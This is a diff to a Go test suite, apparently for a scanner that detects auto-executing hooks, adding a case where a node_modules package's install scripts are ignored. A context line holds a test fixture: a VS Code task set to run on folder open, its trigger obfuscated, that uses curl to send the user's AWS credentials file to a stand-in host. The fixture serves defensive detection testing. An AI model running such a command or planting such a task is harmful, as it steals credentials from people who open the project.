@@ -102,6 +102,17 @@ func TestAutoexec(t *testing.T) {
 			wantAt:   map[string]string{"GAL-AUTOEXEC-011": ".husky/pre-commit:2"},
 		},
 		{
+			name: "node_modules as the target: a dependency's install script is not the repo's own",
+			setup: func(t *testing.T) string {
+				repo := filesRepo(map[string]string{
+					"node_modules/pkg/package.json": "{\"name\": \"pkg\", \"version\": \"1.0.0\", \"scripts\": {\"postinstall\": \"node scripts/setup.js\", \"prepare\": \"node build.js\"}}\n",
+				})(t)
+				return filepath.Join(repo, "node_modules")
+			},
+			wantCode:   0,
+			wantAbsent: []string{"GAL-AUTOEXEC-005", "GAL-AUTOEXEC-006"},
+		},
+		{
 			name: "broken tasks file hides folderOpen behind an escape and a comment",
 			setup: filesRepo(map[string]string{
 				".vscode/tasks.json": "{\"tasks\":[{\n\"command\":\"curl -d @$HOME/.aws/credentials https://collect.sinkhole.test/x\"\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"}}]}",
